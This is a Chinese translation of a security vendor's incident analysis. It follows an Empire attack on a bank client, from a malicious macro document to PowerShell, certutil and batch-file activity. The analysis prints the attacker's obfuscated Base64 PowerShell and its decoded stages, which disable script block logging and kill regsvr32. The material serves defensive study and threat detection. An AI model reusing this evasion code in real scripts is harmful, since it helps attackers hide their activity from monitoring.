## 直奔主题

 **近期，我们在对一份来自大型银行客户的PoC进行研究，研究了几天之后，我们在同一台设备上发现了多个安全威胁，其中包括渗透测试过程中常见的威胁。**

比如说：

1.Eicar样本；

2.CQHashDumpv2（密码导出工具）；

3.NetCat安装。

我们在询问客户之后，得知原来其中的部分事件是当时在得到授权的情况下所进行的渗透测试检查。

但随后，我们发现了一个针对Firefox的漏洞利用活动，整个攻击时间轴如下图所示：

![1.png](https://image.3001.net/images/20181205/1544013246_5c07c5be74a5e.png!small)

这张图足矣帮助我们了解设备上到底发生了什么。接下来，我们还发现了以下几个有意思的地方：

###
**1.攻击是从一个通过Firefox浏览器下载的恶意Word文档开始的（很可能是某封邮件的），这个文档使用了宏功能来开启[PowerShell](https://www.sentinelone.com/blog/windows-powershell-malicious/)控制台，然后运行Empire代码。**

我们的客户端检测到的漏洞利用文件如下：

![2.png](https://image.3001.net/images/20181205/1544013257_5c07c5c9b5401.png!small)

根据VirusTotal的记录，我们检测到的这个漏洞利用文件是之前没出现过的。漏洞利用代码的首次上传时间为2018-10-24 09:17:01
UTC，就在客户设备打开该文件的两个小时之前。

![3.png](https://image.3001.net/images/20181205/1544013271_5c07c5d78092b.png!small)

### 2.检测到该威胁之后，VT中的57个引擎只有12个（基于AI的引擎）能识别出这个恶意文档：

![4.png](https://image.3001.net/images/20181205/1544013290_5c07c5eac2667.png!small)

### 3.PowerShell中加载了经过混淆处理的Base64代码：

![5.png](https://image.3001.net/images/20181205/1544013290_5c07c5eac35f4.png!small)

下面给出的是经过混淆处理后的代码：

    
    
    -W 1-C[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('c3RvcC1wcm9jZXNzIC1uYW1lIHJlZ3N2cjMyIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ=='))|iex;[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('SWYoJHtQYFNgVmVyc2BJb05UQWJsZX0uUFNWZXJzaW9OLk1hSk9yIC1nZSAzKXske2dgUGZ9PVtSRWZdLkFTU2VNYmx5LkdFVFRZUEUoKCdTeXN0ZW0uJysnTWFuYWdlJysnbWUnKydudCcrJy5BJysndXRvbWF0aW9uLlUnKyd0aWxzJykpLiJHZVRGSWVgTGQiKCgnY2FjaGVkRycrJ3JvJysndXAnKydQb2xpYycrJ3lTZXR0aW4nKydncycpLCdOJysoJ29uUHUnKydibGljLCcrJ1N0YXQnKydpYycpKTtJZigke2dgcEZ9KXske0dgUGN9PSR7R2BwZn0uR2V0VkFMVWUoJHtOdWBMbH0pO0lmKCR7Z2BwY31bKCdTJysnY3InKydpcHRCJykrKCdsbycrJ2NrTG8nKydnZ2knKyduZycpXSl7JHtHYFBDfVsoJ1NjcmlwdCcrJ0InKSsoJ2wnKydvY2tMb2dnaScrJ25nJyldWygnRW5hJysnYicrJ2xlJysnU2MnKydyaXB0QicpKygnbG8nKydja0wnKydvZ2cnKydpbmcnKV09MDske2dgUEN9WygnU2NyaScrJ3AnKyd0QicpKygnbG9jaycrJ0xvZ2dpJysnbicrJ2cnKV1bKCdFbmEnKydiJysnbGVTYycrJ3JpJysncHRCJysnbG9ja0ludm9jYXRpb25Mb2cnKydnaScrJ25nJyldPTB9JHtWYEFsfT1bQ29sbGVDdGlvTnMuR2VOZVJ

接下来，我们对Base64代码进行了恢复，整个过程分为两个阶段：

 **半混淆代码**

    
    
    If(${P`S`Vers`IoNTAble}.PSVersioN.MaJOr-ge3){${g`Pf}=[REf].ASSeMbly.GETTYPE(('System.'+'Manage'+'me'+'nt'+'.A'+'utomation.U'+'tils'))."GeTFIe`Ld"(('cachedG'+'ro'+'up'+'Polic'+'ySettin'+'gs'),'N'+('onPu'+'blic,'+'Stat'+'ic'));If(${g`pF}){${G`Pc}=${G`pf}.GetVALUe(${Nu`Ll});If(${g`pc}[('S'+'cr'+'iptB')+('lo'+'ckLo'+'ggi'+'ng')]){${G`PC}[('Script'+'B')+('l'+'ockLoggi'+'ng')][('Ena'+'b'+'le'+'Sc'+'riptB')+('lo'+'ckL'+'ogg'+'ing')]=0;${g`PC}[('Scri'+'p'+'tB')+('lock'+'Loggi'+'n'+'g')][('Ena'+'b'+'leSc'+'ri'+'ptB'+'lockInvocationLog'+'gi'+'ng')]=0}${V`Al}=[ColleCtioNs.GeNeR

 **去混淆代码**

    
    
     If(${PSVersIoNTAble}.PSVersioN.MaJOr-ge
    
    3){${gPf}=[REf].ASSeMbly.GETTYPE(('System.Management.Automation.Utils'))."GeTFIeLd"(('cachedGroupPolicySe
    
    ttings'),'N'+('onPublic,Static'));If(${gpF}){${GPc}=${Gpf}.GetVALUe(${NuLl});If(${gpc}[('ScriptB')+('lockLogging')]){${G
    
    PC}[('ScriptB')+('lockLogging')][('EnableScriptB')+('lockLogging')]=0;${gPC}[('ScriptB')+('lockLogging')][('EnableScript
    
    BlockInvocationLogging')]=0}${V`Al}=[ColleCtioNs.GeNeR

原来，这是一段非常流行的Empire代码，GitHub上就有：【[传送门](https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http_hop.py)】。

### 4.certutil进程加载了一份可疑文件：

    
    
    emp.txt hvKqcJJPFnm7.txt

大家也看到了，这个文件的文件名非常奇怪。作为一个txt文件，文件名里面还有一个.txt，因此它成功引起了我们的注意。

![6.png](https://image.3001.net/images/20181205/1544013365_5c07c63530809.png!small)

### 5.我们还怀疑cmd加载了一个BAT文件：

代码中涉及到的文件名是很长的随机名称，而文件地址为\AppData\Roaming\目录。

## 总结

对于银行客户来说，这种类型的攻击有可能导致严重的后果，甚至会造成财产损失。因此，及时检测并分析PoC就显得至关重要了。在我们的这次分析中，我们成功从PoC中提取出了威胁标识，这样就可以帮助大家进一步提升终端保护解决方案的有效性了。

 ***参考来源：[sentinelone](https://www.sentinelone.com/blog/how-we-detected-a-real-empire-exploit-attack/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

